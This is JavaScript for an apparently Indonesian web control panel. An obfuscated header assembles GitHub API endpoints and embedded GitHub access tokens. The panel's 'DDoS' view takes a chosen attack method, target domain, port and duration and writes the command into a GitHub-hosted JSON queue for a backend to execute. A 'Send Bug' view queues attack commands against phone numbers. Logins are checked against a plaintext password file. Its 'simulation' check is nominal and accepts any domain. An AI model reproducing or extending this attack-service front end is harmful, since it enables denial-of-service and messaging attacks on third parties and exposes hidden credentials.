(function(_0x2ccd3a,_0x191fe8){const _0x2013ae=_0x2ccd3a();function _0x3d74d4(_0x3b5f2a,_0xf930b7,_0x5eb6b4,_0x2a3af3){return _0x47a4(_0x2a3af3-0x1b1,_0x5eb6b4);}function _0xe34f8c(_0x53cfb8,_0x1144db,_0x1fdac1,_0x5d7692){return _0x47a4(_0x53cfb8- -0x2eb,_0x1fdac1);}while(!![]){try{const _0x438e21=parseInt(_0xe34f8c(-0x23e,-0x223,-0x22f,-0x227))/(-0x1c58+0x1b3e+0x1*0x11b)+parseInt(_0x3d74d4(0x214,0x212,0x220,0x236))/(-0x74d*-0x5+0x5af*0x1+-0x2a2e)*(parseInt(_0x3d74d4(0x25a,0x24e,0x270,0x252))/(0x26d3+0x1159*-0x1+-0x1577))+parseInt(_0x3d74d4(0x226,0x229,0x22d,0x234))/(-0xb0b+-0x194f+-0x245e*-0x1)*(-parseInt(_0x3d74d4(0x202,0x247,0x217,0x225))/(-0x29*0x29+-0x26c5+0x2d5b))+-parseInt(_0x3d74d4(0x238,0x265,0x25a,0x24a))/(-0x42*0x6+-0x7c7*-0x1+-0x635)*(parseInt(_0xe34f8c(-0x234,-0x21e,-0x217,-0x229))/(0x1faf*0x1+-0x324+-0x1c84))+-parseInt(_0x3d74d4(0x280,0x276,0x27f,0x260))/(-0x830+0xd87+-0x54f)+parseInt(_0x3d74d4(0x23a,0x236,0x25a,0x23e))/(0xed0+0x243*-0x3+-0x2*0x3ff)+parseInt(_0x3d74d4(0x252,0x25e,0x235,0x242))/(0xb7e+0xf75+-0x1ae9);if(_0x438e21===_0x191fe8)break;else _0x2013ae['push'](_0x2013ae['shift']());}catch(_0x6930b2){_0x2013ae['push'](_0x2013ae['shift']());}}}(_0x2dd8,-0x13748e+0x1*0xf8e6f+-0x13*-0xea5f));const _0x51b7a5=(function(){function _0x5477f2(_0x1830c6,_0x12ff85,_0x4ea3c0,_0x1e7085){return _0x47a4(_0x12ff85-0x50,_0x1830c6);}const _0x260d8d={'LqohG':function(_0x1c359c,_0x1f3f32){return _0x1c359c(_0x1f3f32);},'GQvIk':function(_0x345694,_0x26f338){return _0x345694+_0x26f338;},'ZkkrL':_0x5477f2(0x113,0xf4,0x101,0xe1)+_0x236a69(0x18,0x4,-0x3,-0x1e),'grEjp':_0x236a69(0x1b,0x1a,0xa,-0x4)+_0x5477f2(0xff,0xe5,0xf3,0xf6)+'rn\x20this\x22)('+'\x20)','QfKup':_0x236a69(-0x26,0x1,-0x6,-0x9),'JOeMm':function(_0xe2c1fc,_0x394829){return _0xe2c1fc!==_0x394829;}};let _0x57f885=!![];function _0x236a69(_0x1f9407,_0x5f18d3,_0x38e2a2,_0x3a2983){return _0x47a4(_0x38e2a2- -0x96,_0x5f18d3);}return function(_0xbdd69a,_0x3752bb){function _0x2cb5e3(_0x3880cf,_0x4a65aa,_0x2f7667,_0x8811ee){return _0x5477f2(_0x8811ee,_0x3880cf-0x10,_0x2f7667-0x19f,_0x8811ee-0x33);}function _0x4d96bd(_0x26e175,_0x2f0065,_0x5df61e,_0x6135d1){return _0x236a69(_0x26e175-0x1d0,_0x6135d1,_0x26e175-0x1c7,_0x6135d1-0x122);}const _0x366ed0={};_0x366ed0[_0x4d96bd(0x1e4,0x200,0x1f8,0x1d8)]=_0x260d8d[_0x4d96bd(0x1e1,0x1e6,0x1ef,0x204)];const _0x18c89e=_0x366ed0;if(_0x260d8d[_0x4d96bd(0x1c8,0x1bf,0x1de,0x1e8)](_0x2cb5e3(0xd5,0xdc,0xf9,0xec),_0x2cb5e3(0xd5,0xe8,0xb7,0xd4)))_0x2d9fbf=_0x260d8d['LqohG'](_0x1046ad,_0x260d8d[_0x2cb5e3(0x112,0x11f,0xf4,0x10c)](_0x260d8d[_0x2cb5e3(0x112,0x10a,0x131,0x124)](_0x260d8d[_0x2cb5e3(0x116,0x118,0x10f,0xf7)],_0x260d8d['grEjp']),');'))();else{const _0x5e4360=_0x57f885?function(){function _0x12557c(_0x43654b,_0x34f3a9,_0x2d1d93,_0x21f418){return _0x2cb5e3(_0x21f418-0x8c,_0x34f3a9-0x142,_0x2d1d93-0x8,_0x43654b);}function _0x28139f(_0x2d400b,_0xb999df,_0x41661c,_0x14fdd2){return _0x2cb5e3(_0x41661c-0x92,_0xb999df-0x146,_0x41661c-0x1bd,_0xb999df);}if(_0x18c89e[_0x28139f(0x1c4,0x1bf,0x1a5,0x1b7)]===_0x28139f(0x178,0x19d,0x182,0x18c)){if(_0x3752bb){const _0x1978e9=_0x3752bb[_0x28139f(0x17a,0x15b,0x17a,0x193)](_0xbdd69a,arguments);return _0x3752bb=null,_0x1978e9;}}else _0x1278b0=_0x5e44f0;}:function(){};return _0x57f885=![],_0x5e4360;}};}()),_0xce42e9=_0x51b7a5(this,function(){const _0x536928={};_0x536928[_0x1cd1e2(0x12b,0x11a,0x138,0x142)]=_0x1cd1e2(0xf9,0xfb,0xe4,0x118)+'+$';function _0x558eac(_0x32308b,_0x80dcf9,_0x3a72cc,_0x1468d1){return _0x47a4(_0x80dcf9- -0x8e,_0x3a72cc);}function _0x1cd1e2(_0x2c767,_0x29d76a,_0x4ff443,_0x3044d8){return _0x47a4(_0x2c767-0x7d,_0x29d76a);}const _0x431b65=_0x536928;return _0xce42e9['toString']()[_0x1cd1e2(0x122,0x140,0x11b,0x124)](_0x431b65[_0x558eac(0x39,0x20,0xa,0x27)])[_0x558eac(-0x23,-0x13,-0x10,-0x8)]()[_0x558eac(-0x9,0x19,0x9,0x20)+'r'](_0xce42e9)[_0x1cd1e2(0x122,0x140,0x125,0x104)](_0x431b65[_0x1cd1e2(0x12b,0x139,0x139,0x124)]);});_0xce42e9();function _0x2dd8(){const _0x132e98=['avageStore','yYPLY','8212077uPRnsJ','warn','UIxzX','APBev','31828270CLBzXT','hlcwL','nction()\x20','bind','ctor(\x22retu','zMtwO','JOeMm','https://ap','60qhqbDn','exception','juBgy','brKcI','i.github.c','error','console','{}.constru','19731meorvH','Gd8_2NXF8c','slEyR','return\x20(fu','search','rn\x20this\x22)(','constructo','FDKCr','KZJWgvKATY','jjlHe','info','0GSq1y4y1n','140831ozGqQK','xQzUg','5455376NbOYyd','QfKup','om/repos/R','GQvIk','oQfax','Z3W','__proto__','ZkkrL','980238PqtckH','zVmZI','fQXqZ','MLTUAJc0V9','qtjlx','/apk-zenny','15710nZofvH','vxslP','xQlMs','azobu/cont','ity.json','ents/dbweb','ents/sende','toString','(((.+)+)+)','r.json','rAgNiKNImZ','ents/activ','w4pgCDvXps','github_pat','prototype','2244XDeZdT','AcDLa','150kBQuNo','trace','.json','apply','_11BXTLBFA','jLD7UJnbzB'];_0x2dd8=function(){return _0x132e98;};return _0x2dd8();}function _0x47a4(_0x2b3bd1,_0xce42e9){const _0x51b7a5=_0x2dd8();return _0x47a4=function(_0x2dd815,_0x47a4c1){_0x2dd815=_0x2dd815-(-0x4e7+-0x1351+0x3*0x839);let _0x49ed07=_0x51b7a5[_0x2dd815];return _0x49ed07;},_0x47a4(_0x2b3bd1,_0xce42e9);}function _0x41a564(_0x21d5b2,_0x4f1d70,_0x50fa90,_0x23313a){return _0x47a4(_0x21d5b2-0x100,_0x50fa90);}const _0x590315=(function(){function _0x21a340(_0x522b03,_0xf2ef54,_0x3e9510,_0x354747){return _0x47a4(_0x354747- -0x38,_0x3e9510);}const _0x2b2eee={};_0x2b2eee[_0x21a340(0x5c,0x75,0x5e,0x57)]='xHKnT',_0x2b2eee['zVmZI']=function(_0x546d4f,_0x32ec4b){return _0x546d4f!==_0x32ec4b;},_0x2b2eee[_0xbaee51(-0x2a0,-0x295,-0x2aa,-0x2b2)]=_0xbaee51(-0x2ba,-0x2ad,-0x2c6,-0x2c8);const _0x23e269=_0x2b2eee;let _0xb0c085=!![];function _0xbaee51(_0x2bff02,_0x3feb5c,_0x5ac0b9,_0x5ec367){return _0x47a4(_0x3feb5c- -0x350,_0x5ec367);}return function(_0x1dea06,_0x4fbd35){function _0x1766c6(_0x167a8c,_0x4b2ab7,_0x1cca13,_0x2e97a8){return _0xbaee51(_0x167a8c-0x1e5,_0x1cca13-0x424,_0x1cca13-0x1b,_0x2e97a8);}function _0x3ba868(_0x3457ae,_0x935006,_0x4a5ec6,_0x1a358f){return _0xbaee51(_0x3457ae-0xef,_0x4a5ec6-0x48a,_0x4a5ec6-0x173,_0x3457ae);}if(_0x23e269[_0x3ba868(0x1ee,0x208,0x1f2,0x1f0)](_0x23e269[_0x1766c6(0x17e,0x192,0x18f,0x183)],_0x23e269[_0x3ba868(0x1dd,0x1dd,0x1f5,0x1db)])){const _0x53a57d=_0x5f0dbd[_0x3ba868(0x1c6,0x1e6,0x1e1,0x1f4)+'r']['prototype'][_0x1766c6(0x160,0x185,0x168,0x143)](_0x1c333a),_0x3649b9=_0x28070c[_0x135802],_0x159945=_0x5d6741[_0x3649b9]||_0x53a57d;_0x53a57d['__proto__']=_0x1516fc[_0x1766c6(0x16b,0x16c,0x168,0x16a)](_0x3962be),_0x53a57d[_0x3ba868(0x1b2,0x1a5,0x1b5,0x194)]=_0x159945[_0x3ba868(0x1d6,0x1d1,0x1b5,0x1c0)][_0x3ba868(0x1ee,0x1cf,0x1ce,0x1b2)](_0x159945),_0x194f0f[_0x3649b9]=_0x53a57d;}else{const _0x440ce0=_0xb0c085?function(){function _0x11aa74(_0x4c8470,_0x28778b,_0x581708,_0x5bd695){return _0x1766c6(_0x4c8470-0x4,_0x28778b-0x1d6,_0x581708-0x2fc,_0x4c8470);}function _0x490386(_0x39f24b,_0x2f3b58,_0x150bfc,_0x2267cd){return _0x1766c6(_0x39f24b-0x1b1,_0x2f3b58-0xb6,_0x2f3b58-0x20b,_0x39f24b);}if(_0x23e269[_0x490386(0x364,0x36e,0x383,0x350)]!==_0x23e269[_0x490386(0x387,0x36e,0x354,0x353)]){const _0x10287e=_0x15822c?function(){function _0x109254(_0x1e7a06,_0x5c31cc,_0x148a21,_0x5012b2){return _0x11aa74(_0x1e7a06,_0x5c31cc-0x2c,_0x5012b2- -0x119,_0x5012b2-0xad);}if(_0x179eab){const _0x26652e=_0x4f52e4[_0x109254(0x321,0x34a,0x330,0x33f)](_0x2019a4,arguments);return _0x4e1a66=null,_0x26652e;}}:function(){};return _0x5cb4fa=![],_0x10287e;}else{if(_0x4fbd35){const _0x103f61=_0x4fbd35[_0x490386(0x370,0x367,0x37b,0x35f)](_0x1dea06,arguments);return _0x4fbd35=null,_0x103f61;}}}:function(){};return _0xb0c085=![],_0x440ce0;}};}()),_0xd5a1ca=_0x590315(this,function(){function _0x20ccec(_0x43293e,_0x12bdb4,_0x260dc8,_0x214ea9){return _0x47a4(_0x43293e-0x3e2,_0x260dc8);}const _0x3b5b42={'brKcI':function(_0x257001,_0x362c97){return _0x257001(_0x362c97);},'AcDLa':function(_0x43f9a5,_0x2603fb){return _0x43f9a5+_0x2603fb;},'hlcwL':_0x510c40(-0x277,-0x270,-0x297,-0x283)+'nction()\x20','FDKCr':_0x20ccec(0x482,0x46d,0x464,0x472)+_0x510c40(-0x26e,-0x27b,-0x29f,-0x292)+_0x20ccec(0x488,0x4a6,0x489,0x469)+'\x20)','YHdbx':function(_0x25e8db){return _0x25e8db();},'fQXqZ':_0x510c40(-0x2a9,-0x2aa,-0x2bb,-0x299),'yYPLY':_0x510c40(-0x289,-0x26f,-0x27a,-0x27c),'zMtwO':_0x510c40(-0x269,-0x281,-0x2a7,-0x289),'xQlMs':function(_0x3cc399,_0x3c0e75){return _0x3cc399<_0x3c0e75;}},_0x3b1b12=function(){let _0x1183bd;function _0x2d37cb(_0x32146c,_0x38de45,_0x1c6dfe,_0x15590e){return _0x20ccec(_0x1c6dfe- -0x585,_0x38de45-0x1b6,_0x32146c,_0x15590e-0x186);}function _0x5c48b3(_0x2124ff,_0x589385,_0x242757,_0x13b28b){return _0x20ccec(_0x2124ff- -0x34f,_0x589385-0x1b0,_0x242757,_0x13b28b-0x136);}try{_0x1183bd=_0x3b5b42[_0x5c48b3(0x12f,0x137,0x12b,0x130)](Function,_0x3b5b42[_0x2d37cb(-0xfe,-0x12a,-0x11f,-0x130)](_0x3b5b42[_0x5c48b3(0x125,0x10d,0x131,0x139)],_0x3b5b42[_0x5c48b3(0x13b,0x152,0x154,0x140)])+');')();}catch(_0x210a8a){_0x1183bd=window;}return _0x1183bd;};function _0x510c40(_0x21c0e4,_0x24af77,_0x1da7f3,_0x2db73d){return _0x47a4(_0x2db73d- -0x327,_0x21c0e4);}const _0x55467f=_0x3b5b42['YHdbx'](_0x3b1b12),_0x5c6737=_0x55467f[_0x510c40(-0x282,-0x28d,-0x29e,-0x288)]=_0x55467f[_0x510c40(-0x267,-0x279,-0x299,-0x288)]||{},_0x5ab38=['log',_0x3b5b42[_0x510c40(-0x280,-0x268,-0x267,-0x26e)],_0x3b5b42[_0x20ccec(0x46e,0x455,0x491,0x45d)],_0x3b5b42[_0x510c40(-0x28d,-0x2ab,-0x2b1,-0x291)],_0x20ccec(0x47c,0x461,0x4a0,0x471),'table',_0x20ccec(0x468,0x47b,0x45c,0x476)];for(let _0x3c0c97=-0xedd+0x201*-0xc+0x26e9;_0x3b5b42[_0x20ccec(0x458,0x439,0x45e,0x45a)](_0x3c0c97,_0x5ab38['length']);_0x3c0c97++){if(_0x20ccec(0x48c,0x476,0x483,0x46d)===_0x510c40(-0x28d,-0x288,-0x2a7,-0x28c)){const _0x52abca=_0x1bb718?function(){function _0x3ca8f1(_0x13a4ea,_0x431486,_0xae7ba8,_0x8db1fc){return _0x510c40(_0x8db1fc,_0x431486-0x12d,_0xae7ba8-0x12a,_0xae7ba8-0x190);}if(_0x1c063b){const _0x1fadc1=_0xef5cec[_0x3ca8f1(-0x116,-0x119,-0x10f,-0x11a)](_0x39bfc6,arguments);return _0x3a85ad=null,_0x1fadc1;}}:function(){};return _0xb5abc5=![],_0x52abca;}else{const _0x29a2ac=_0x590315[_0x20ccec(0x489,0x478,0x479,0x490)+'r'][_0x510c40(-0x282,-0x2c6,-0x2b9,-0x2a5)]['bind'](_0x590315),_0x2a7f0b=_0x5ab38[_0x3c0c97],_0x51a60b=_0x5c6737[_0x2a7f0b]||_0x29a2ac;_0x29a2ac[_0x510c40(-0x282,-0x282,-0x24e,-0x272)]=_0x590315[_0x20ccec(0x476,0x497,0x499,0x47e)](_0x590315),_0x29a2ac['toString']=_0x51a60b[_0x20ccec(0x45d,0x460,0x478,0x459)][_0x20ccec(0x476,0x478,0x471,0x457)](_0x51a60b),_0x5c6737[_0x2a7f0b]=_0x29a2ac;}}});function _0x49b6c2(_0x4863af,_0x276461,_0x41c2de,_0x2c073f){return _0x47a4(_0x2c073f-0x3a9,_0x4863af);}_0xd5a1ca();const API_LOGIN='https://ap'+_0x41a564(0x19d,0x1b0,0x191,0x1a5)+_0x49b6c2(0x46c,0x46b,0x45f,0x45a)+_0x49b6c2(0x430,0x44b,0x427,0x434)+'/apk-zenny'+_0x49b6c2(0x43d,0x43a,0x429,0x420)+_0x49b6c2(0x42c,0x40b,0x43f,0x422)+_0x41a564(0x187,0x179,0x1a5,0x1a2),TOKEN_LOGIN=_0x49b6c2(0x44a,0x437,0x417,0x42a)+_0x49b6c2(0x42e,0x410,0x412,0x432)+_0x49b6c2(0x437,0x462,0x431,0x455)+_0x41a564(0x1a2,0x1c4,0x1b5,0x18e)+_0x49b6c2(0x425,0x407,0x43b,0x429)+_0x49b6c2(0x445,0x42d,0x426,0x433)+_0x41a564(0x17e,0x184,0x18d,0x181)+_0x49b6c2(0x444,0x447,0x445,0x452)+'MLTUAJc0V9'+_0x49b6c2(0x454,0x46e,0x47e,0x45d),API_BUGS=_0x49b6c2(0x43f,0x42f,0x45f,0x441)+_0x49b6c2(0x452,0x44e,0x43f,0x446)+'om/repos/R'+_0x49b6c2(0x450,0x437,0x411,0x434)+_0x41a564(0x173,0x180,0x190,0x17b)+_0x49b6c2(0x407,0x442,0x412,0x420)+_0x41a564(0x17a,0x186,0x16d,0x15e)+_0x49b6c2(0x448,0x409,0x405,0x426),TOKEN_BUGS='github_pat'+_0x41a564(0x189,0x183,0x1a7,0x17f)+_0x41a564(0x1ac,0x193,0x197,0x18c)+_0x49b6c2(0x462,0x460,0x450,0x44b)+_0x49b6c2(0x414,0x42b,0x444,0x429)+_0x49b6c2(0x417,0x42c,0x410,0x433)+_0x49b6c2(0x443,0x419,0x423,0x427)+_0x41a564(0x1a9,0x1b7,0x1bf,0x1c2)+_0x41a564(0x1ba,0x1c3,0x1d3,0x1c3)+_0x49b6c2(0x453,0x462,0x43b,0x45d),API_ACTIVITY=_0x41a564(0x198,0x194,0x177,0x191)+_0x41a564(0x19d,0x19f,0x191,0x1b0)+_0x41a564(0x1b1,0x1a7,0x1a1,0x1ca)+'avageStore'+'/apk-zenny'+_0x41a564(0x177,0x182,0x176,0x153)+_0x41a564(0x17f,0x16e,0x16d,0x18e)+_0x49b6c2(0x42f,0x3fd,0x42f,0x421),TOKEN_ACTIVITY=_0x49b6c2(0x44e,0x437,0x423,0x42a)+_0x49b6c2(0x441,0x44c,0x444,0x432)+'0GSq1y4y1n'+_0x41a564(0x1a2,0x1b2,0x1ad,0x1ae)+_0x49b6c2(0x405,0x42d,0x43b,0x429)+_0x49b6c2(0x439,0x422,0x446,0x433)+_0x49b6c2(0x41a,0x42a,0x42f,0x427)+_0x49b6c2(0x46e,0x465,0x473,0x452)+_0x41a564(0x1ba,0x1ad,0x1a8,0x1d2)+_0x41a564(0x1b4,0x198,0x1c5,0x1b1);

  	// Custom Dropdown Role
const roleBtn = document.getElementById("roleBtn");
const roleList = document.getElementById("roleList");
const newRole = document.getElementById("newRole");

roleBtn.onclick = () => roleList.classList.toggle("hidden");

roleList.querySelectorAll("li").forEach(li => {
  li.onclick = () => {
    roleBtn.innerHTML = `<span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">${li.innerHTML}</span> ▾`;
    newRole.value = li.dataset.value;
    roleList.classList.add("hidden");
  };
});



function ddos_isSimTarget(target){
  if(!target) return false;
  const t = target.trim();

  // disallow if contains protocol or spaces
  if(/\s/.test(t)) return false;
  if(/^(https?:\/\/)/i.test(t)) return false;

  // disallow IPv4/IPv6 raw addresses
  const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(t);
  const isIPv6 = /:/.test(t) && /^[0-9a-fA-F:]+$/.test(t);
  if(isIPv4 || isIPv6) return false;

  // allow domain-like strings (contains at least one dot and alpha chars)
  if(/^[a-z0-9\-]+\.[a-z0-9\-\.]+$/i.test(t)) return true;

  // allow SIM: or sim- prefixed tokens for explicit simulation
  if(/^SIM:|^sim-/i.test(t)) return true;

  // otherwise disallow
  return false;
}

/* write minimal-format entry to idch.json:
   { command: "...", status: "pending" } */
async function ddos_sendCommandToGithub(command, target) {
  if(!ddos_isSimTarget(target)) throw new Error('Target tidak valid — gunakan nama domain (example.com) atau prefix SIM: untuk simulasi.');

  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    throw new Error('Helper githubGet/githubPut tidak ditemukan di halaman.');
  }

  // fetch current idch.json
  const { content: oldContent, sha } = await githubGet(API_BUGS, TOKEN_BUGS);
  const base = (oldContent && oldContent.data) ? oldContent : { server: "Active", data: [] };

  // minimal entry format required
  const entry = {
    command: command,
    status: "pending"
  };

  base.data.push(entry);

  // commit back to GitHub
  await githubPut(API_BUGS, TOKEN_BUGS, base, `log: ${command}`, sha);
  return entry;
}

/* increment activity count and sync UI */
async function ddos_incrementActivity(delta = 1){
  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    console.warn('github helpers not found for activity increment');
    return null;
  }
  const res = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
  const data = res.content || { Activitas: 0 };
  data.Activitas = (parseInt(data.Activitas, 10) || 0) + delta;
  await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, data, `activity +${delta}`, res.sha);

  // update UI elements if present
  const el = document.getElementById('ddosActivityCount');
  if(el) el.textContent = data.Activitas;
  const globalEl = document.getElementById('activityCount');
  if(globalEl) globalEl.textContent = data.Activitas;

  return data.Activitas;
}

/* UI wiring */
(function(){
  const cards = document.querySelectorAll('#ddosMethodGrid .ddos-card');
  let chosenCmd = null;
  cards.forEach(c => {
    c.addEventListener('click', () => {
      cards.forEach(x => x.classList.remove('selected'));
      c.classList.add('selected');
      chosenCmd = c.dataset.cmd; // e.g. ".slow"
    });
  });

  const btn = document.getElementById('sendDdosBtn');
  const msgEl = document.getElementById('ddosMsg');
  const targetInput = document.getElementById('ddosTargetInput');
  const portInput = document.getElementById('ddosPortInput');
  const durInput = document.getElementById('ddosDurationInput');
  const serverEl = document.getElementById('ddosServerStatus');

  btn.addEventListener('click', async () => {
    try {
      if(!chosenCmd) throw new Error('Pilih type DDoS dulu.');
      const rawTarget = (targetInput.value || '').trim();
      if(!rawTarget) throw new Error('Isi target.');

      // sanitize dur & port to digits only; use 'auto' if empty
      const durRaw = (durInput.value || '').trim();
      const portRaw = (portInput.value || '').trim();
      const dur = durRaw === '' ? 'auto' : (durRaw.replace(/\D/g,'') || 'auto');
      const port = portRaw === '' ? 'auto' : (portRaw.replace(/\D/g,'') || 'auto');

      // build command with colons exactly as requested
      const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
      
      // setelah: const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;

// buat string link untuk tampil di pesan (tambahkan http:// jika belum ada)
const link = /^(https?:\/\/)/i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;


      // send minimal-format entry to idch.json
      await ddos_sendCommandToGithub(cmd, rawTarget);

      // increment activity count
      await ddos_incrementActivity(1);

      // visual feedback
      if(serverEl) serverEl.textContent = 'ON';
      msgEl.textContent = `Berhasil Dikirim ke "${link}"`;
      msgEl.style.color = 'var(--success)';
if (typeof showPopupNotif === 'function') {
  showPopupNotif(`Succes!\n${link}`, true);
}

      // brief server ON flash
      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 2000);

    } catch(err) {
      msgEl.textContent = err.message || 'Gagal mengirim command.';
      msgEl.style.color = 'var(--danger)';
      if(typeof showPopupNotif === 'function') showPopupNotif(err.message || 'Gagal', false);
    }
  });
})();

async function loadActivity() {
  try {
    const res = await fetch(API_ACTIVITY, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const actData = JSON.parse(content);
    document.getElementById('activityCount').textContent = actData.Activitas || 0;
  } catch (err) {
    console.error("Gagal load activity:", err);
  }
}

async function loadServer() {
  try {
    const res = await fetch(API_SERVER, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const srvData = JSON.parse(content);
    document.getElementById('serverStatus').textContent =
      srvData.Servers?.Active ? "ON" : "OFF";
  } catch (err) {
    console.error("Gagal load server:", err);
  }
}

// panggil otomatis saat masuk ke view-bug
document.addEventListener("DOMContentLoaded", () => {
  loadActivity();
  loadServer();
});

// ===== CONFIG BUG =====


let selectedBug = null;

// Pilih bug type
document.querySelectorAll('.bug-card').forEach(card=>{
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.bug-card').forEach(c=> c.classList.remove('selected'));
    card.classList.add('selected');
    selectedBug = card.dataset.cmd;
  });
});

// Tombol Send Bug
document.getElementById('sendBugBtn').addEventListener('click', async()=>{
  const num = document.getElementById('bugNumber').value.trim();
  const msg = document.getElementById('bugMsg');

  if(!num){ msg.textContent="Nomor wajib diisi!"; msg.style.color="var(--danger)"; return; }
  if(!selectedBug){ msg.textContent="Pilih type bug terlebih dahulu!"; msg.style.color="var(--danger)"; return; }

  const command = `${selectedBug} ${num}`;

  try {
    // Ambil isi JSON lama (idch.json)
    const {content, sha} = await githubGet(API_BUGS, TOKEN_BUGS);
    let bugs = content || { server: "Active", data: [] };

    // Tambahkan entry baru ke data[]
    bugs.data.push({
      command: command,
      status: "pending"
    });

    // Update ke GitHub (idch.json)
    await githubPut(API_BUGS, TOKEN_BUGS, bugs, `send bug ${command}`, sha);

    // 🔥 Update activity.json biar naik jumlahnya
    const act = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
    let actData = act.content || { Activitas: 0 };
    actData.Activitas = (parseInt(actData.Activitas) || 0) + 1;
    await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, actData, "update activity", act.sha);

    // ✅ Refresh tampilan activity
    loadActivity();

    // ✅ Notif sukses + animasi
    showPopupNotif(`Bug berhasil dikirim ke ${num}`);

  } catch(err){
    msg.textContent = "Gagal kirim bug: " + err.message;
    msg.style.color = "var(--danger)";
  }
});

    // ====== CONFIG (Dari Anda) ======


    // ====== STATE ======
    let state = {
      user:null, role:null,
      loginSha:null, loginList:[],
      numbersSha:null, numbers:[],
    }

    // ====== UTIL ======
    async function githubGet(url, token){
      const res = await fetch(url, {headers:{Authorization:`token ${token}`, Accept:'application/vnd.github+json'}});
      if(res.status === 404){
        return {content:null, sha:null, notFound:true}
      }
      if(!res.ok){ throw new Error('GitHub GET failed: '+res.status) }
      const data = await res.json();
      const decoded = data.content ? JSON.parse(atob(data.content)) : null;
      return {content:decoded, sha:data.sha}
    }

    async function githubPut(url, token, jsonContent, message, sha){
      const body = {
        message,
        content: btoa(JSON.stringify(jsonContent, null, 2)),
        sha: sha || undefined
      }
      const res = await fetch(url, {
        method:'PUT',
        headers:{'Content-Type':'application/json', Authorization:`token ${token}`, Accept:'application/vnd.github+json'},
        body: JSON.stringify(body)
      });
      if(!res.ok){
        const t = await res.text();
        throw new Error('GitHub PUT failed: '+res.status+' '+t)
      }
      return await res.json();
    }

    function toast(el, msg, ok=true){ el.textContent = msg; el.style.color = ok? 'var(--success)':'var(--danger)'; }

    function setView(id){
  // sembunyikan semua view
  document.querySelectorAll('main[id^="view-"]').forEach(m => {
    m.classList.add('hidden');
    m.classList.remove('visible'); // reset animasi
  });

  // tampilkan target
  const target = document.getElementById('view-'+id);
  if(target){
    target.classList.remove('hidden');
    // delay supaya browser reset style → animasi muncul lagi
    setTimeout(()=> target.classList.add('visible'), 50);
  }

  // update menu drawer
  document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
  const link = document.querySelector(`.menu a[data-view="${id}"]`);
  if(link) link.classList.add('active');

  drawer.classList.remove('open');
  window.scrollTo({top:0, behavior:'smooth'});
}

function showBugSuccess(msg) {
  const bugMsg = document.getElementById("bugMsg");
  bugMsg.textContent = msg;
  bugMsg.style.color = "lime";

  // ✅ Tambahkan animasi ke card Bug
  const bugCard = bugMsg.closest(".card");
  bugCard.classList.remove("success-anim"); // reset dulu kalau ada
  void bugCard.offsetWidth;                 // trigger reflow biar animasi bisa ulang
  bugCard.classList.add("success-anim");
}
    
    function parseExpired(input){
  const now = new Date();
  if(!input) return null;

  const trimmed = input.trim().toLowerCase();

  // kalau cuma angka → default = hari
  if(/^\d+$/.test(trimmed)){
    now.setDate(now.getDate() + parseInt(trimmed));
    return now.toISOString();
  }

  const m = trimmed.match(/(\d+)\s*(hari|jam|h|j)/i);
  if(!m) return null;

  const val = parseInt(m[1]);
  const unit = m[2];

  if(unit.startsWith('h')) now.setDate(now.getDate() + val);   // hari/h
  else if(unit.startsWith('j')) now.setHours(now.getHours() + val); // jam/j

  return now.toISOString();
}

    // ====== LOGIN FLOW ======
    async function loadLogins(){
  const {content, sha} = await githubGet(API_LOGIN, TOKEN_LOGIN);

  if(Array.isArray(content)){
    state.loginList = content;
  } else if(content && typeof content === "object"){
    // kalau object tunggal, bungkus jadi array
    state.loginList = [content];
  } else {
    state.loginList = [];
  }

  state.loginSha = sha;
}

async function deleteAccount(username){
  try {
    // filter akun yang bukan username ini
    state.loginList = state.loginList.filter(acc => acc.username !== username);

    // simpan ke GitHub
    await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete user ${username}`, state.loginSha);

    // reload list & render ulang
    await loadLogins();
    renderAccounts();

    toast(accMsg, `Akun "${username}" berhasil dihapus`, true);
  } catch(e){
    toast(accMsg, `Gagal hapus akun`, false);
  }
}

    async function doLogin(username, password){
  await loadLogins();
  const found = state.loginList.find(u => u.username === username && u.password === password);
  if(!found) return null;

  if(found.expired){
    const expDate = new Date(found.expired).getTime();
    if(Date.now() > expDate){
      // hapus akun expired
      state.loginList = state.loginList.filter(x=>x.username !== username);
      await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete expired user ${username}`, state.loginSha);
      throw new Error("Akun sudah kedaluwarsa dan dihapus");
    }
  }

  state.user = username; 
  state.role = found.role;
  localStorage.setItem('session', JSON.stringify({u:username, r:found.role}));
  return found;
}

    function restoreSession(){
  const s = localStorage.getItem('session');
  if(!s){
    setView('login'); // kalau belum login → tampilkan login
    return;
  }

  const {u, r} = JSON.parse(s);
  state.user = u; 
  state.role = r;

  document.getElementById('who').textContent = u + ' • ' + r;
  document.getElementById('userBadge').classList.remove('hidden');
  document.getElementById('roleChip').textContent = r;
  if(r==='admin') document.getElementById('adminSection').classList.remove('hidden');
  document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    // 🔥 panggil nav biar muncul
    showBottomNav();

  showBottomNav(); 
  setView('dashboard');
        startNotifCycle();
  loadNumbers();
}

    function logout(){
      localStorage.removeItem('session'); location.reload();
    }

   // ----- Bottom nav helpers -----
function setActiveBottomNav(view){
  const items = document.querySelectorAll('#bottomNav a[data-view]');
  items.forEach(a => {
    if(a.dataset.view === view) a.classList.add('active');
    else a.classList.remove('active');
  });
}

function showBottomNav(){
  const bottomNav = document.getElementById('bottomNav');
  if(!bottomNav) return;

  bottomNav.classList.remove('hidden');
  void bottomNav.offsetWidth;
